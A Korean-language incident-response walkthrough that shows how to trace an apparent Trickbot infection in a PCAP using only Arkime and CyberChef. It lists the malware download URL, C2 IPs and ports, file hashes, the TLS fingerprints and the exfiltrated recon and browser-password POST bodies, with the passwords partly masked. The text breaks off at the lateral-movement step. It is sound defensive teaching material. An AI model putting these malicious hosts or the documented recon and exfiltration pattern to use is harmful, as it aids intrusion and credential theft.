---
title: Arkime만으로 분석하기 — 스크립트 다운로더에서 비밀번호 탈취, TLS C2, 침해사고 티켓까지
tags:
  - blue-team
  - pcap
  - arkime
  - cyberchef
  - trickbot
  - c2
  - credential-theft
  - ticket
---

# Arkime만으로 분석하기 — 스크립트 다운로더에서 비밀번호 탈취, TLS C2, 침해사고 티켓까지 { #arkime-only-walkthrough }

!!! abstract "사례 요약"
    `mondogreek.com` 도메인의 윈도우 10 PC 한 대가 브라우저가 아닌 **스크립트로** `YAS20.exe`를 받았습니다. 12분 안에 공인 IP를 확인하고, **449·447 포트**로 암호화된 C2를 열고, 모듈을 더 받고, **훔친 브라우저 비밀번호와 정찰 정보를 평문 HTTP POST로 보냈고**, 같은 망을 **SMB 445**로 훑었습니다(거절됨). 패턴은 **Trickbot**과 일치합니다(추정, 오프라인이라 해시 조회 불가). 전 과정을 **Arkime 웹 화면만으로** 풀었고, 디코딩에만 CyberChef를 썼으며, 마지막에 침해사고 티켓을 완성합니다.

| | |
|---|---|
| **증거** | PCAP 1개, 2020-03-11 21:22:35 – 22:06:41 UTC (44분 06초), 세션 1,131개 |
| **환경** | 폐쇄망, 인터넷 없음(VirusTotal, OSINT 불가). Arkime v5.6.4 웹 화면 + CyberChef(오프라인) |
| **결과물** | 침해사고 티켓: 인덱스, 설명, 영향받은/외부 장비, 검색 쿼리, 증거 위치, 작업 로그와 짝이 맞는 도구 출력 |
| **관련 페이지** | [Arkime로 PCAP 분석하기](../../network/arkime/offline-pcap-guide.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md) · [비콘과 C2](../../network/beaconing-c2.md) · [EternalBlue / SMBv1](../../adversary/eternalblue-smbv1.md) |

!!! tip "이 페이지 사용법"
    Arkime 검색은 모두 코드 블록에 있습니다. 블록 오른쪽의 **복사 버튼**을 누르면 됩니다. 맨 끝의 [복사용 쿼리 모음](#query-sheet)에는 다음 PCAP에 바로 쓸 수 있게 `<자리표시>`로 바꾼 쿼리를 모았습니다. **질문** 상자는 분석하면서 실제로 나온 질문과 그 답입니다.

## 한눈에 보는 답 { #answers }

| 항목 | 답 | 상태 |
|---|---|---|
| 감염 PC | **10.3.11.194 LAPTOP-7XMV2SN**, 사용자 **otis.witherspoon**, MAC `b8:ca:3a:ec:3b:8f`, Windows 10 Pro 빌드 18363 | 확인됨 |
| 첫 악성 이벤트 | **21:24:36 UTC** — `bolton-tech[.]com`(50.87.248.17)에서 `GET /YAS20.exe`, 요청 주체 `WinHttp.WinHttpRequest.5` | 확인됨 |
| 네트워크 | 10.3.11.0/24, 게이트웨이 10.3.11.1, DC/DNS/DHCP **10.3.11.3 Mondogreek-DC**, 도메인 `mondogreek.com` | 확인됨 |
| C2 | TLS **190.214.13.2:449**(상시 연결), **185.14.31.98:447**(다운로드, 자체 서명 `example.com` 인증서), 185.180.198.50:447(응답 없음), HTTP POST **203.176.135.102:8082** | 확인됨 |
| 유출 | 21:36:52–21:38:49 평문 POST 5개: 브라우저 비밀번호(IE, Firefox), 프로세스 목록, systeminfo, ipconfig·net·nltest 결과 | 확인됨 |
| 측면 이동 | 21:36:47, 21:37:17에 10.3.11.119, .218, .1, .131, .254로 SMBv1 전용 탐색 — **모두 거절** | 확인됨(시도 실패) |
| 범위 | 다른 내부 PC는 외부 IOC와 통신하지 않음 | 확인됨 |
| 악성코드 계열 | Trickbot 유형(URI `/yas20/<호스트>_W10018363.<봇ID>/81/`, 447/449 포트, `example.com`/"Global Security" 인증서, 모듈 방식 탈취) | 추정 |

---

## 0단계 — Arkime가 데이터를 보여주는 방식 { #step-0 }

Arkime는 패킷을 한 개씩 보여주지 않고 **세션** 단위로 묶습니다. 세션은 두 끝점 사이의 대화 하나입니다. 예: `10.3.11.194:51234 → 8.8.8.8:53`. 세션마다 시작·끝 시간, 패킷 수, 바이트, 프로토콜, 그리고 분석된 경우 HTTP/DNS/TLS 필드가 붙습니다.

쓰게 될 탭:

| 탭 | 용도 |
|---|---|
| **Sessions** | 검색 결과 세션 목록. `+`를 누르면 상세와 패킷이 열림 |
| **SPI View** | 필드마다 값과 개수 — Splunk의 `stats count by field`와 비슷 |
| **Connections** | 누가 누구와 통신하는지 그래프 |
| **Settings** | 시간대(**UTC**로 설정) |

!!! warning "함정 1 — 시간 범위"
    시간 선택의 기본값은 **Last hour(최근 1시간)**입니다. 오래된 PCAP은 **아무것도 안 나옵니다.** 첫 검색 전에 **All**로 바꾸거나 Start/End를 직접 넣으세요.

!!! warning "함정 2 — 시간대"
    Arkime는 기본으로 **브라우저(내 PC)의 시간대**로 표시합니다. 티켓은 UTC로 씁니다. **Settings → General → Timezone Format → UTC**로 바꾸면 그래프 축의 시간 뒤에 `UTC`가 붙습니다.

### 데이터 시작·끝 시간과 세션 수 { #data-range }

!!! question "질문: 세션 단위라면 데이터의 시작 시간과 끝 시간은 어떻게 보나요?"
    세션마다 **Start Time**(첫 패킷)과 **Stop Time**(마지막 패킷)이 있습니다.

    - **데이터 시작** = 모든 세션 중 가장 빠른 Start Time
    - **데이터 끝** = 모든 세션 중 가장 늦은 Stop Time

    1. Sessions 탭, 시간 범위 **All**, 검색창 비우고 **Search**
    2. **Start Time** 열 제목을 눌러 **오름차순** → 첫 줄의 Start Time이 데이터 시작
    3. **Stop Time** 열 제목을 눌러 **내림차순** → 첫 줄의 Stop Time이 데이터 끝

    끝 시간은 Start Time 내림차순이 아니라 Stop Time으로 봅니다. 일찍 시작해 오래 이어진 세션(다운로드, C2 연결)이 가장 늦게 끝날 수 있기 때문입니다.

    다른 방법: 타임라인 막대그래프(첫 막대와 마지막 막대, 대략 볼 때), **Files** 탭(읽어 들인 PCAP의 `First Date`, 시작만). 전체 개수는 목록 위 `Showing 1 - 50 of 1,131 entries`에 나옵니다.

이 PCAP의 결과:

```text
Start  2020/03/11 21:22:35 UTC
End    2020/03/11 22:06:41 UTC   (duration 00:44:06)
Sessions 1,131
```

---

## 1단계 — 전체 그림 { #step-1 }

검색창을 비운 채 **SPI View → general**.

```text
Protocols  tcp (672)  udp (458)  tls (349)  dns (325)  http2 (126)  ldap (79)  krb5 (78)
           http (44)  dcerpc (41)  smb (30)  llmnr (29)  ssdp (16)  ntp (9)  mdns (8)  quic (6)  igmp (1)
Src IP     10.3.11.119 (491)  10.3.11.194 (377)  10.3.11.218 (259)  10.3.11.3 (3)  52.242.211.89 (1)
```

읽는 법:

- **내부망은 `10.3.11.0/24`.** 바쁜 세 대(.119, .194, .218)는 워크스테이션입니다. `10.3.11.3`은 세션을 거의 시작하지 않습니다. 서버는 주로 **받는** 쪽이라 서버 후보입니다.
- **`ldap`, `krb5`, `dcerpc`, `smb`** = 정상 Active Directory 트래픽. 다만 **워크스테이션끼리** SMB/DCERPC가 오가면 측면 이동 신호이니 나중에 확인합니다.
- **`llmnr`, `ssdp`, `mdns`, `igmp`** = 윈도우 평소 잡음.
- **`tls`, `http2`**는 암호화. **`http`(44)**는 평문이라 헌팅을 시작하기 가장 쉬운 곳입니다.
- **출발지로 나온 `52.242.211.89`**는 이상합니다(외부가 세션을 시작하는 경우는 드묾). [3단계](#step-3)에서 확인합니다.

### DC 확인 { #dc }

```text
ip.dst == 10.3.11.3
```

`ip.dst` = 목적지 IP 필드, `==` = 같다. 결과: 세션 571개, 프로토콜 `dns (325) ldap (79) krb5 (78) dcerpc (41) smb (24) ntp (9)`, 출발지는 워크스테이션 세 대. DNS + Kerberos + LDAP + RPC + SMB + NTP가 한 서버로 모이면 **도메인 컨트롤러 / DNS**입니다.

!!! tip "기본으로 안 보이는 필드"
    general 섹션에서 **Dst Port** 필드 버튼을 누르면 값이 나옵니다. 53, 88, 389, 135, 445가 보이면 DC가 맞습니다.

---

## 2단계 — Kerberos로 호스트이름과 사용자 찾기 { #step-2 }

티켓에는 **IP + 호스트이름**이 필요합니다. Kerberos에는 컴퓨터 계정과 사용자 계정 이름이 모두 들어 있습니다.

```text
ip.src == 10.3.11.0/24 && protocols == krb5
```

| 부분 | 뜻 |
|---|---|
| `ip.src == 10.3.11.0/24` | 출발지가 내부 PC 아무거나(CIDR 사용 가능) |
| `&&` | 그리고 — 두 조건을 모두 만족 |
| `protocols == krb5` | Kerberos 세션만 |

!!! question "질문: krb5 섹션에 cname, Realm, sname 같은 필드 이름만 나오고 값이 안 나와요. 어떻게 하나요?"
    SPI View는 속도 때문에 **필드 이름을 먼저** 보여주고 값은 요청할 때 불러옵니다. `cname`, `Realm`, `sname`은 값이 아니라 필드 버튼입니다.

    - **필드 이름**(예: `cname`)을 누르면 그 필드 값만 불러오고,
    - 섹션 오른쪽 **Load All**을 누르면 섹션의 모든 필드를 불러옵니다.

    `cname Cnt`, `Realm Cnt`처럼 `Cnt`가 붙은 것은 세션당 값 개수라서 지금은 무시해도 됩니다.

결과:

```text
cname  laptop-i9zpi04$ (8)  otis.witherspoon (6)  laptop-7xmv2sn$ (4)  laptop-sqsa42o$ (4)
       dominga.mcdowell (2)  dorian.neff (2) …
Realm  MONDOGREEK.COM (62)  MONDOGREEK (8)  mondogreek.com (8)
sname  krbtgt/MONDOGREEK.COM (26)  cifs/Mondogreek-DC.mondogreek.com (9)
       ldap/Mondogreek-DC.mondogreek.com (6)  host/laptop-7xmv2sn.mondogreek.com (2) …
```

- **끝이 `$`인 cname** = 컴퓨터 계정(호스트이름). `$`가 없으면 사용자 계정.
- **Realm** = 도메인. **sname** = 요청한 서비스: `krbtgt/…` 로그인 티켓, `cifs/…` 파일 공유, `ldap/…` 디렉터리. `cifs/Mondogreek-DC…`에서 **DC 이름**이 나옵니다.

이름과 IP를 짝지으려면 cname 값을 클릭 → **and**(검색창에 `krb5.cname == "…"` 추가) → 검색 → **Src IP**를 봅니다. 또는 IP별로 `ip.src == 10.3.11.194 && protocols == krb5`처럼 검색합니다.

| IP | 호스트이름 | 사용자 |
|---|---|---|
| 10.3.11.3 | Mondogreek-DC | — |
| 10.3.11.119 | LAPTOP-SQSA42O | dorian.neff |
| 10.3.11.194 | LAPTOP-7XMV2SN | otis.witherspoon |
| 10.3.11.218 | LAPTOP-I9ZPI04 | dominga.mcdowell |

---

## 3단계 — 외부 "출발지" 배제하기 { #step-3 }

```text
ip.src == 52.242.211.89
```

세션 하나: `52.242.211.89:443 → 10.3.11.194:50355`, 패킷 2개, 21:32:00. 상세를 읽습니다.

| 필드 | 값 | 뜻 |
|---|---|---|
| TCP Flags | `SYN 0 SYN-ACK 0 PSH 1 RST 1` | 핸드셰이크가 없음 — 연결이 **캡처 전부터** 있었음 |
| 포트 | 443 → 50355 | 443 = 서버, 50355 = 클라이언트 임시 포트. 실제 클라이언트는 노트북 |
| 흐름 | 서버 PSH → 클라이언트 RST | 클라이언트가 이미 닫은 연결에 서버가 데이터를 보냄 |
| 페이로드 | 읽을 수 없음 | 암호화된 TLS 레코드 |
| MAC | Src Netgear, Dst Dell | 외부 IP 패킷은 항상 **게이트웨이 MAC**으로 들어옴 |

Arkime는 **캡처된** 첫 패킷을 보낸 쪽을 출발지로 표시합니다. **인바운드 아님, 무해**(`ARIN`, Microsoft Azure 대역). 확인했다는 사실을 **Not Found**로 기록합니다. 배제한 것도 티켓에 들어갑니다.

---

## 4단계 — 평문 HTTP 훑기 { #step-4 }

```text
ip.src == 10.3.11.0/24 && protocols == http
```

SPI View → **http** → **Load All**. 중요한 필드:

| 필드 | 이유 |
|---|---|
| Hostname (`host.http`) | 어느 사이트 |
| URI | 경로와 파일 이름 |
| Request Method | `GET` 받기, `POST` 보내기. 외부로 가는 POST = 유출/C2 후보 |
| Status Code | 200, 404 … |
| Useragent | 요청한 프로그램. 브라우저가 아니면 의심 |
| **Body Magic** | 본문의 **실제** 파일 종류. 이름과 상관없이 `application/x-dosexec` = 윈도우 EXE/DLL |

**잡음부터 걸러냅니다:** `ctldl.windowsupdate.com`, `ocsp.digicert.com`, `crl.securetrust.com`(UA `Microsoft-CryptoAPI/10.0`), `fonts.googleapis.com`, `fonts.gstatic.com`, `*.wsimg.com`, 그리고 실제 Edge/Chrome User-Agent로 본 사이트들.

남는 것:

| 단서 | 값 | 수상한 이유 |
|---|---|---|
| EXE 다운로드 | `bolton-tech.com/YAS20.exe`, Body Magic `application/x-dosexec (2)`, 응답 `application/x-msdownload` | 평문 HTTP로 실행 파일 |
| IP 직접 "이미지" | `64.44.133.131/images/cursor.png (2)`, `/images/imgpaper.png (1)` | 도메인 없음. `x-dosexec`가 하나 더 있음 |
| C2처럼 보이는 URI | `203.176.135.102:8082/yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB…CAED6/81/ (4)`, `/90 (1)` | IP 직접, 8082 포트, URI 안에 **피해 PC 이름 + 윈도우 빌드 + 봇 ID** |
| IP 확인 | `checkip.amazonaws.com/` | 감염 직후 공인 IP 확인은 악성코드의 흔한 행동 |
| User-Agent | `KSKJJGJ`, `WinHTTP loader/1.0`, `WinHttp.WinHttpRequest.5`, `MSIE 7.0; Windows NT 10.0`(4) | 브라우저가 아님. 윈도우 10의 IE 7은 불가능 |
| 개수 | `GET 39`, `POST 5`, `multipart/form-data` × 5 | C2 URI 4 + 1 = POST 5 = 업로드 5 |

---

## 5단계 — 수상한 HTTP를 시간 순서로 세우기 { #step-5 }

```text
host.http == bolton-tech.com || ip.dst == 64.44.133.131 || ip.dst == 203.176.135.102 || host.http == checkip.amazonaws.com
```

`||` = 또는(하나라도 맞으면). 출발지 조건은 일부러 뺐습니다. **어느 PC가** 했는지를 결과로 확인하기 위해서입니다. **Start Time 오름차순**으로 정렬합니다.

9개 세션 모두 **10.3.11.194**에서 나왔습니다:

```text
21:24:36  10.3.11.194:49727 → 50.87.248.17:80     GET bolton-tech.com/YAS20.exe
21:32:00  10.3.11.194:49787 → 18.235.112.207:80   GET checkip.amazonaws.com/
21:36:45  10.3.11.194:49816 → 64.44.133.131:80    GET /images/cursor.png + /images/imgpaper.png  (1.2 MB)
21:36:52  10.3.11.194:50080 → 203.176.135.102:8082  /81/
21:36:55  10.3.11.194:50081 → 203.176.135.102:8082  /81/
21:36:57  10.3.11.194:50082 → 64.44.133.131:80    GET /images/cursor.png  (611 KB)
21:36:59  10.3.11.194:50091 → 203.176.135.102:8082  /90
21:37:19  10.3.11.194:50098 → 203.176.135.102:8082  /81/
21:37:52  10.3.11.194:50099 → 203.176.135.102:8082  /81/   (no more HTTP to these IPs afterwards)
```

### YAS20.exe 세션 { #yas20 }

요청(Source 쪽):

```http
GET /YAS20.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
Host: bolton-tech.com
```

- 헤더가 4줄뿐이고 **Referer, Accept-Language가 없음**: 사람이 브라우저에서 클릭한 게 아닙니다.
- `WinHttp.WinHttpRequest.5`는 **VBScript, JScript, PowerShell, 오피스 매크로**가 쓰는 윈도우 COM 객체입니다. 스크립트가 EXE를 받아 왔다 → 악성 스크립트나 문서로 초기 침투(추정).

응답(Destination 쪽): `Content-Type: application/x-msdownload`, `Content-Length: 466944`, `Server: Apache`, `Last-Modified: Tue, 10 Mar 2020`(하루 전에 올림), 그리고 이상한 헤더:

```text
host-header: c2hhcmVkLmJsdWVob3N0LmNvbQ==
```

!!! example "CyberChef: From Base64"
    끝의 `==`는 전형적인 Base64입니다. **From Base64**에 넣으면 `shared.bluehost.com` — 공유 웹호스팅이라서 `bolton-tech.com`은 공격자가 만든 사이트라기보다 **해킹당해 파일 보관소로 쓰인 일반 사이트**일 가능성이 높습니다.

---

## 6단계 — 받은 파일의 종류와 해시 { #step-6 }

```text
host.http == bolton-tech.com || ip.dst == 64.44.133.131
```

SPI View → http:

```text
Body Magic  application/x-dosexec (2)
Body MD5    179345004c39336eaba39863b95f268b  9dfb3952172deeddb3a5e3cafed933bc  e40d7846eae7d8a98c0e3512e5461e4c
```

64.44.133.131의 "png" 응답:

```http
HTTP/1.1 200 OK
Server: nginx/1.6.2
Content-Type: Content-type: application/octet-stream
Content-Length: 582656
```

- 각각 약 570KB — 마우스 커서 그림치고 너무 큽니다.
- `Content-Type: Content-type: …` — 헤더 이름이 두 번: 정상 웹서버가 아니라 직접 만든 악성 서버의 특징입니다.
- 요청 쪽 User-Agent는 `WinHTTP loader/1.0`, Host는 IP 그대로.

**그림으로 위장한 실행 파일일 가능성이 높습니다.** Arkime는 HTTP 본문마다 **Body MD5**를 계산해 둡니다. 오프라인이라 조회는 못 하지만 악성코드 분석용 IOC로 티켓에 넣습니다. (MD5 3개가 각각 어느 파일인지는 확인하지 않았습니다. 세션마다 HTTP 부분을 열어 짝을 맞추면 됩니다.)

!!! tip "바이트로 파일 종류 확인하기"
    세션을 열어 Destination 본문을 봅니다. 진짜 PNG는 `‰PNG`로 시작하고, 윈도우 PE는 `MZ`로 시작하며 `This program cannot be run in DOS mode`가 보입니다. 또는 본문을 내려받아 CyberChef **Detect File Type**에 넣습니다.

---

## 7단계 — 무엇을 올려 보냈는지 읽기 { #step-7 }

!!! question "질문: 21:36:59 세션이 POST라는 건 어떻게 알았나요?"
    처음에는 **본 게 아니라 추론**이었습니다. SPI View에 `POST (5)`, `multipart/form-data` × 5, C2 URI `/81/` × 4 + `/90` × 1 = 5가 있었고, 나머지 HTTP는 모두 그림·폰트·스크립트를 받는 GET이었습니다.

    SPI View는 값을 셀 뿐 **어느 세션에 어떤 값이 있는지는 알려 주지 않고**, 세션 목록의 Info 칸에는 URI만 나오고 Method는 안 나옵니다. 그래서 티켓에 쓰기 전에 직접 확인해야 합니다.

    ```text
    http.method == POST
    ```

    결과 5개, 모두 `10.3.11.194 → 203.176.135.102:8082` = 추론 확인. 세션 상세에도 `Method POST (1)`이 보입니다.

`/90` 세션: `POST …/90`, User-Agent **`KSKJJGJ`**, `multipart/form-data; boundary=aksgja8s8d8a8s97`, `Content-Length: 5366`. **Src databytes 5,609 대 Dst 120** → 업로드. 서버는 `200`, `server: Cowboy`, 본문 `/1/`(3바이트, 받았다는 응답)로 답했습니다.

!!! question "질문: `natural`을 `ascii`로 바꿔도 본문에 파란 글씨 `90`만 보여요. 왜 그런가요?"
    `natural` / `ascii` / `utf8` / `hex`는 **바이트를 어떤 글자로 표시할지**만 바꿉니다. 링크로 바꾸는 건 HTTP 본문을 파일로 뽑아 주는 별도 설정입니다.

    1. **Packet Options ▾ → Hide Images & Files**(또는 *Show Images & Files* 체크 해제). 본문이 그대로 펼쳐지고, `ascii`나 `hex`가 적용됩니다.
    2. 또는 세션 맨 위의 **Source Raw**를 누르면 클라이언트가 보낸 모든 바이트(헤더 + 본문)가 파일 하나로 내려받아집니다. CyberChef에서 **Open file as input**으로 열고, 깨져 보이면 **Strings**를 추가합니다.
    3. 파란 링크를 직접 눌러도 본문만 파일로 받을 수 있습니다.

### `/90` — 정찰 정보 덤프 { #post-90 }

multipart 본문은 `--aksgja8s8d8a8s97` 경계선으로 두 칸이 나뉘고, 칸마다 `name="…"`이 붙습니다.

```text
--aksgja8s8d8a8s97
Content-Disposition: form-data; name="proclist"

***TASK LIST***
[System Process]
System
…
MsMpEng.exe            ← Defender was running
…
VMMM;;;;영상ثافوزبت.exe   ← nonsense name mixing Latin, Korean and Arabic: likely the malware process
…
--aksgja8s8d8a8s97
Content-Disposition: form-data; name="sysinfo"

***S Y S T E M I N F O***
HostName: LAPTOP-7XMV2SN
OSName: Microsoft Windows 10 Pro
…
/c ipconfig /all
/c net config workstation
/c net view /all                     → System error 6118
/c net view /all /domain             → System error 6118
/c nltest /domain_trusts
/c nltest /domain_trusts /all_trusts
***LOCAL MACHINE DATA***
User name: CN=Otis Witherspoon,CN=Users,DC=mondogreek,DC=com
Domain controller: Mondogreek-DC.mondogreek.com
Admin Name: Administrator
--aksgja8s8d8a8s97--
```

- `/c …` = `cmd.exe /c`로 실행한 명령.
- `MsMpEng.exe` = Defender가 켜져 있었는데도 감염됨.
- `VMMM;;;;영상ثافوزبت.exe` = 영어·한글·아랍어가 섞인 말도 안 되는 이름 → 악성코드 프로세스일 가능성이 높음. 호스트 조사용 IOC.
- `nltest /domain_trusts`와 관리자 이름 조회 = **도메인 전체**를 파악하는 것, 측면 이동 준비.
- 교차 확인: ipconfig 결과의 MAC(`B8-CA-3A-EC-3B-8F`)이 Arkime가 보여준 10.3.11.194의 Src Ethernet MAC과 같습니다. 호스트 증거와 네트워크 증거가 일치합니다.

### `/81/` — 출처별로 하나씩 보낸 훔친 비밀번호 { #post-81 }

```text
http.method == POST && ip.dst == 203.176.135.102 && http.uri == *81*
```

| 시간 | Content-Length | `source` 칸 | `data` 칸 |
|---|---|---|---|
| 21:36:52 | 274 | `IE passwords` | <code>https://www.facebook.com/&#124;otis.witherspoon@mondogreek.com&#124;P@ss********</code> |
| 21:36:55 | 551 | `firefox passwords` | Firefox 계정 토큰(`keyFetchToken`, `unwrapBKey`) + <code>https://accounts.firefox.com&#124;otis.witherspoon@mondogreek.com&#124;&lt;같은 비밀번호&gt;</code> |
| 21:37:19 | 219 | `OpenVPN passwords and configs` | 비어 있음 |
| 21:37:52 | 210 | `OpenSSH private keys` | 비어 있음 |

- `data` = `URL | 아이디 | 비밀번호`, **평문**.
- 두 사이트에 **같은 비밀번호** → 도메인 계정도 같은 비밀번호일 위험이 큼.
- Firefox 토큰이 있으면 계정 세션을 끊기 전까지 동기화된 데이터에 접근할 수 있음.
- `data`가 비어 있음 = 찾은 게 없음. 대응팀이 VPN·SSH 키를 교체할 필요가 없다는 정보가 됨.
- `/81/` = 비밀번호 보고, `/90` = 정찰 보고 — URI 끝 번호가 데이터 종류를 뜻함. `/81/` 4개는 가짜 `MSIE 7.0; Windows NT 10.0` User-Agent, `/90`은 `KSKJJGJ`를 사용.

!!! danger "티켓에는 비밀 정보를 가려서"
    훔친 비밀번호를 티켓에 그대로 쓰면 티켓을 읽는 모든 사람에게 또 유출됩니다. `P@ss********`처럼 가리고 증거 PCAP을 가리키세요.

---

## 8단계 — 숨은(암호화된) C2 찾기 { #step-8 }

HTTP 보고는 21:37:52에 끝나지만 캡처는 22:06까지 이어집니다. 이런 악성코드는 **TLS 채널**을 계속 열어 둡니다.

### 이상한 포트 { #unusual-ports }

```text
ip.src == 10.3.11.194 && ip.dst != 10.0.0.0/8 && port.dst != 80 && port.dst != 443 && port.dst != 53
```

`!=` = 같지 않다. 외부 목적지 중 웹·DNS 포트를 뺀 것만 봅니다.

```text
Dst IP     190.214.13.2 (6)  224.0.0.252 (6)  203.176.135.102 (5)  185.14.31.98 (3)
           239.255.255.250 (3)  224.0.0.251 (2)  185.180.198.50 (1)
Protocols  tcp (15)  udp (11)  tls (9)  llmnr (6)  http (5)  ssdp (3)  mdns (2)
```

- `224.x` / `239.x`는 **멀티캐스트**(LLMNR, SSDP, mDNS)이지 인터넷 서버가 아닙니다. 다음부터는 `&& ip.dst != 224.0.0.0/4`를 붙입니다.
- **443이 아닌 포트의 `tls (9)`**, 목적지는 IP 직접 190.214.13.2, 185.14.31.98, 185.180.198.50 = 숨은 채널.

### 인증서 { #certificates }

```text
ip.src == 10.3.11.194 && protocols == tls
```

SPI View → **cert** → Load All. 발급자 대부분은 Microsoft, Baltimore CyberTrust, DigiCert, Let's Encrypt(윈도우 정상 트래픽)입니다. 어울리지 않는 것:

```text
Issuer/Subject CN   example.com (4)
Issuer/Subject ON   Global Security (4)     Org Unit  IT Department (4)
Issuer/Subject ON   Internet Widgits Pty Ltd (2)
Subject CN          filmstore.xyz (1)  hakunamatatata.com (1)  helpforyourservice.com (1)
```

!!! question "질문: Issuer CN / ON과 Subject CN / ON은 무엇인가요?"
    인증서는 서버의 신분증입니다.

    - **Subject(주인)** = 이 인증서가 **누구 것인지**(예: `www.bing.com`)
    - **Issuer(발급자)** = **누가 확인하고 서명했는지**(예: `Microsoft IT TLS CA 5`)

    각각 안에 **CN**(Common Name, 대표 이름 — 웹사이트는 보통 도메인), **ON**(Organization Name, 회사 이름 — 표준 이름은 `O`이고 Arkime는 `ON`으로 표시), **OU / Org Unit**(부서)이 있습니다.

    인증서는 **사슬**로 이어집니다:

    ```text
    [cert 3] Subject: Baltimore CyberTrust Root   Issuer: Baltimore CyberTrust Root   ← root, signs itself
         ↓ signs
    [cert 2] Subject: Microsoft IT TLS CA 5       Issuer: Baltimore CyberTrust Root   ← intermediate
         ↓ signs
    [cert 1] Subject: www.bing.com                Issuer: Microsoft IT TLS CA 5       ← the website
    ```

    서버는 보통 1번과 2번을 보내고, 루트는 윈도우에 이미 들어 있습니다. 그래서 `microsoft it tls ca 5`는 Issuer CN(49)과 Subject CN(49) **양쪽**에 나오고, `baltimore cybertrust root`는 Issuer에만 나옵니다.

!!! question "질문: 발급자와 주인이 같다는 건 어떻게 판별했나요?"
    처음에는 **SPI View 숫자**로 봤습니다. `example.com`이 Issuer CN(4)과 Subject CN(4)에 있었고, "Global Security", "IT Department", "Internet Widgits"도 마찬가지였습니다. 이건 힌트일 뿐 **증거가 아닙니다.** `let's encrypt authority x3`도 사슬 때문에 2 + 2로 나옵니다(인증서 A의 발급자이면서 인증서 B의 주인).

    자체 서명은 **인증서 한 장 안에서** 발급자 = 주인입니다:

    ```text
    self-signed:  [one cert]  Subject example.com  /  Issuer example.com    ← equal in the same cert
    normal chain: [cert A]    Subject site         /  Issuer CA X
                  [cert B]    Subject CA X         /  Issuer root           ← equal across two certs
    ```

    세션 상세의 **Certificate** 부분에서 확인합니다. 인증서가 한 장씩 따로 나옵니다. (1) 몇 장인지(자체 서명은 보통 **한 장**), (2) 그 한 장 안에서 발급자 = 주인인지 봅니다. Arkime는 세션에 태그도 자동으로 붙입니다: **`cert:self-signed`** 또는 **`cert:certificate-authority`**.

    ```text
    tags == "cert:self-signed"
    ```

이상한 값이 중요한 이유: `example.com`은 **문서 예시용으로 예약된 도메인**이라 실제 서비스가 인증서를 받을 수 없습니다. "Global Security / IT Department"는 그럴듯하지만 의미 없는 이름입니다(이 조합은 Trickbot C2 인증서에서 널리 보고됨). **Internet Widgits Pty Ltd**는 OpenSSL에서 아무것도 안 바꾸고 엔터만 치면 들어가는 기본값입니다.

---

## 9단계 — TLS 타임라인과 C2 판단 { #step-9 }

```text
ip.src == 10.3.11.194 && (ip.dst == 190.214.13.2 || ip.dst == 185.14.31.98 || ip.dst == 185.180.198.50 || cert.issuer.cn == example.com || cert.issuer.on == "Internet Widgits Pty Ltd" || cert.subject.cn == [filmstore.xyz, hakunamatatata.com, helpforyourservice.com])
```

| 부분 | 뜻 |
|---|---|
| `( … )` | 묶기. 없으면 `&&`와 `||`가 엉뚱하게 묶일 수 있음("이 PC이고 IP-1" **또는** "아무 PC든 example.com 인증서") |
| `cert.issuer.cn`, `cert.issuer.on`, `cert.subject.cn` | 인증서 발급자 이름, 발급자 회사, 주인 이름 |
| `[a, b, c]` | 목록 — 이 중 아무거나 |
| `"…"` | 띄어쓰기가 있는 값은 따옴표로 |

세션 14개, 모두 10.3.11.194에서 시작(오름차순):

```text
21:31:58  45.148.120.153:443   filmstore.xyz (CA-signed, cPanel)            62 KB
21:31:59  51.254.164.244:443   cert:self-signed                             61 KB
21:32:07  190.214.13.2:449     tls                                           8 KB  ← first C2
21:35:31  185.180.198.50:447   tcp only, 6 packets, 0 databytes  (no answer)
21:35:53  185.14.31.98:447     cert:self-signed (example.com)             2.1 MB  ← big download
21:35:55  190.214.13.2:449     tls, ~4 min                                  28 KB
21:35:58  190.214.13.2:449     tls, ~3.5 min                                23 KB
21:37:01  190.214.13.2:449     tls                                           8 KB
21:42:12  190.214.13.2:449     tls, ~4 min                                  11 KB
21:42:13  185.14.31.98:447     cert:self-signed                             25 KB
21:42:17  190.214.13.2:449     tls, ~4 min                                   8 KB
21:43:40  199.247.13.144:443   hakunamatatata.com (CA-signed)              570 KB
21:43:51  209.97.130.197:443   helpforyourservice.com (CA-signed)          281 KB
21:44:02  185.14.31.98:447     cert:self-signed  Src 2,185 B / Dst 111,326 B (download)
21:46:06  last session ends — nothing more until 22:06:41
```

185.14.31.98:447의 인증서 확인(21:44:02 세션):

```text
TLSv1.2  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
JA3  72a589da586844d7f0818ce684948eea   JA3S  e35df3e00ca4ef31d42b34bebaa2f86e
JA4  t12i190700_d83cc789557e_16bbda4055b2
Serial 008be295cd71603289   Not Before 2020/03/06 09:53:10 UTC   Not After 2021/03/06 (365 days)
Issuer  CN example.com  O Global Security  OU IT Department
Subject CN example.com  O Global Security  OU IT Department     ← one certificate, equal → self-signed
```

감염 **5일 전**에 만든 인증서: 공격용으로 새로 준비한 서버입니다.

| 목적지 | 역할 | 근거 |
|---|---|---|
| 190.214.13.2:449 | **주 C2** | 드문 포트, IP 직접, 연결을 1~4분 유지, 연결당 8~28KB |
| 185.14.31.98:447 | **모듈 다운로드** | 비밀번호·정찰 보고가 시작되기 직전에 2.1MB, 21:44 세션은 서버 → PC 방향이 확실 |
| 185.180.198.50:447 | **죽은 C2** | SYN 재시도, 응답 없음. 다시 살아날 수 있으니 IOC로 기록 |
| filmstore.xyz, 51.254.164.244, hakunamatatata.com, helpforyourservice.com (443) | **수상한 다운로드** | 감염 직후와 C2 활동 한가운데에 등장, 이상한 도메인. 암호화라 내용은 모름 |

!!! info "비콘의 두 종류"
    비콘은 **짧게 자주**(N초마다 접속, 간격이 일정 — 간격 계산으로 찾음)일 수도 있고, **길게 붙잡는** 방식(연결을 열어 두고 명령을 기다림, 시작 간격은 불규칙, 바이트는 작음)일 수도 있습니다. 190.214.13.2:449는 두 번째입니다.

---

## 10단계 — 범위: 측면 이동과 다른 피해 PC { #step-10 }

### 다른 PC로 퍼지려 했나? { #lateral }

```text
ip.src == 10.3.11.194 && ip.dst == 10.3.11.0/24 && ip.dst != 10.3.11.3
```

